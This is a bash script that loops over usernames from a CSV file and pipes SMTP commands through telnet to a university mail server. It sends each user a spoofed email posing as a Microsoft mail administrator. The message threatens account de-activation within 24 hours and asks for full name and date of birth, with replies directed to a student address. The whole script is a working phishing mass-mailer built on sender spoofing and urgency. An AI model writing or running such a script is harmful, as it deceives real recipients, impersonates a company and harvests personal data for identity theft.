#!/bin/bash

(
sleep 2
echo helo usr
sleep 2
while IFS=, read col1
	do
	echo "MAIL FROM:Mail&nbspAdministrator<noreply@outlook.microsoft.com>"
	sleep 2
	echo "RCPT TO:${col1}@anu.edu.au"
	sleep 2
	echo Data
	sleep 2
	echo "From: Mail Administrator <noreply@outlook.microsoft.com>"
	sleep 2
	echo "To: ${col1}@anu.edu.au;"
	sleep 2
	echo "Reply-To: u5184092@anu.edu.au"
	sleep 2
	echo "Subject: *De-activation of account URGENT*"
	sleep 2
	echo "Mime-Version: 1.0;"
	sleep 2
	echo "Content-Type: text/html; charset="ISO-8859-1";"
	sleep 2
	echo "Content-Transfer-Encoding: 7bit;"
	sleep 2
	echo "<html>"
	echo "<body>"
	echo "<p>We are undergoing a review of current email accounts in an attempt to eliminate fake email accounts.</p>"
	echo "<p>To keep your account active, please respond to this email with the following information:</p>"
	echo "<p>Full Name:<br>Date of Birth</p>"
	echo "<p>Please note, your account will be automatically de-activated if we do not recieve this information within 24 hours.</p>"
	echo "<p>We apologise for any inconvenience and appreciate your understanding.</p>"
	echo "<p>Thank you.</p>"
	echo "<p>Copyright &copy; 2016 Microsoft Inc.</p>"
	echo "</body>"
	echo "</html>"
	sleep 2
	echo "."
	sleep 2
done < secondlist.csv
)|telnet smtphost.anu.edu.au 25 
